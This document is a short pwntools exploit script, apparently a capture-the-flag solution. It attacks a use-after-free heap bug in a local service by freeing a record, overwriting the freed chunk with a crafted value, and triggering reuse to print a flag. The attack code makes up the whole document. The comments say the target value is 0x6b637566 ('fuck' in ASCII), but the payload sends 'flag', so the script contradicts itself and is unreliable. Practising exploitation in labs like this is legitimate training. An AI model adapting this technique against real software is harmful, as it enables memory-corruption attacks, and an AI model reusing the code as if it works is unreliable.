#May 2018 simple UAF Heap exploit by delosec
#!/usr/bin/python
from pwn import *

r = remote('127.0.0.1', 4444)

#if (*(int32_t *)((int32_t)v6 + 64) == 0x6b637566)
payload = "flag"*20 #ascii of 0x6b637566

r.sendline('1')
r.sendline(payload) #first name
r.sendline(payload) #last name
r.sendline('3') #free
r.sendline('4') #overwrite free using memo
r.sendline(payload) #payload to overwrite free chunk 'fuck'*20
r.sendline('3') #UAF - 0x6b637566
r.sendline('5') #print flag
r.interactive() #drop to interactive if no flag - enter '5' manually to print flag
